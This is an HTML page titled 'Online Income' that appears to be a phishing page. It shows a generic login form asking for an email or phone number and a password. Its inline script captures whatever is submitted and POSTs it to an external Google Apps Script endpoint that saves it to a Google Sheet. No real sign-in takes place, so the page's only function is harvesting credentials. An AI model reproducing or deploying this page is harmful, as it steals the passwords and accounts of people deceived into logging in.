<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Online Income</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="img">


        <div class="grid text-center">

            <form name="submit-to-google-sheet">
                <div style="padding-top: 50px;">
                    <div class="mb-2 w-25 d-grid col-6 mx-auto rounded-2">
                        <input type="email" name="email" aria-describedby="emailHelp"
                            placeholder="Email address or phone number">
                    </div>
                    <div class="mb-2 w-25 d-grid col-6 mx-auto">

                        <input type="password" name="password" placeholder="Password">
                    </div>
                    <div class="d-grid gap-2 col-6 mx-auto w-25  rounded-2">
                        <button type="submit" class="btn btn-primary">log In</button>
                    </div>

                </div>
            </form>
        </div>
    </div>
    <script>
        const scriptURL = "https://script.google.com/macros/s/AKfycbz57ZwLDavsZO_X0HJ3rlmE84fbzN0jsycDqyymlz8OraRzCmvWdeRbz6qf7sxdcJM/exec"
        const form = document.forms['submit-to-google-sheet']

        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                .then(response => console.log('Success!', response))
                .catch(error => console.error('Error!', error.message))
        })
    </script>
</body>

</html>
